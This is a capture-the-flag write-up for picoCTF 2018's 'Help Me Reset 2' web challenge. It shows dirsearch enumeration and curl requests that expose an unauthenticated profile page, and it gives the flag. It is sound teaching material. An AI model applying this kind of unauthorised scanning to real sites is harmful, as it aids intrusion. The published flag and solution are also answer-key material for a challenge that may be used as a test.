# Help Me Reset 2
Web Exploitation, 600 points

## Description:
> There is a website running at http://2018shell3.picoctf.com:52603 (link). We need to get into any user for a flag! 



## Solution:

The link led to a website which contained a login page, together with a "Forgot your password" mechanism.

The "Forgot your password" mechanism required a username to proceed.

None of the common usernames seemed to work, and both forms did not seem vulnerable to any common attacks.

At this point, I turned to some automated tools to scan the site. One of them was dirsearch, which scans the site for common URIs:
```console
# python3 dirsearch.py -u http://2018shell3.picoctf.com:52603/ -ext="*"

 _|. _ _  _  _  _ _|_    v0.3.8
(_||| _) (/_(_|| (_| )

Extensions: xt=* | Threads: 10 | Wordlist size: 6040

Error Log: /root/utils/dirsearch/logs/errors-18-10-24_23-23-21.log

Target: http://2018shell3.picoctf.com:52603/

[23:23:22] Starting: 
[23:31:20] 200 - 1019B  - /login
[23:31:25] 302 -  209B  - /logout  ->  http://2018shell3.picoctf.com:52603/
[23:33:21] 200 -  804B  - /profile
[23:33:45] 200 -  899B  - /reset

Task Completed
```

The profile page was accessible without any authentication needed:
```console
root@kali:/media/sf_CTFs/pico/Help_Me_Reset_2# curl -s http://2018shell3.picoctf.com:52603/profile | grep pico
<title>Congrats flag: picoCTF{i_thought_i_could_remember_those_a131a54c}</title>
  <h1>Congrats flag: picoCTF{i_thought_i_could_remember_those_a131a54c}</h1>
```

This is ironic, given the fact that the hint to the challenge says "Try looking past the typical vulnerabilities. Think about possible programming mistakes" and the expected solution (according to other writeups) is to use the maintainer username as appears in the site comments:
```console
root@kali:/media/sf_CTFs/pico/Help_Me_Reset_2# curl -s http://2018shell3.picoctf.com:52603/ | grep maintained
<!--Proudly maintained by goncalves-->
```

The flag: picoCTF{i_thought_i_could_remember_those_a131a54c}